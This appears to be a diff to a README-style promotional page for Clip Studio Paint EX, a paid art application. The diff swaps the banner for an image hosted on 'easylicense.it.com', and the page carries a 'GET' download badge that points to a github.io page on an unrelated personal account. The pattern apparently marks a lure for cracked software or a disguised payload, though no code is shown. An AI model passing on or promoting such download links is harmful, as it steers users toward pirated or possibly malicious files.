@@ -2,7 +2,7 @@
 
 Clip Studio Paint EX is a digital art application for creating illustrations, manga, comics, and animated sequences. Its drawing tools, layer controls, page management features, and animation workspace support detailed creative projects from initial sketches to finished artwork.
 
-![Clip Studio Paint EX Banner](https://m.media-amazon.com/images/I/71cjd6D0cxL._AC_UF1000,1000_QL80_.jpg)
+![Clip Studio Paint EX Banner](https://easylicense.it.com/wp-content/uploads/2025/12/Clip-Studio-Paint-EX-2026-600x671.jpg)
 
 [![GET — Clip Studio Paint EX](https://img.shields.io/badge/GET%20%E2%80%94%20Clip%20Studio%20Paint%20EX-0078D6?style=for-the-badge&logoColor=white)](https://margarethallj519.github.io/.github/Clip-Studio-Paint-EX-2026)
 
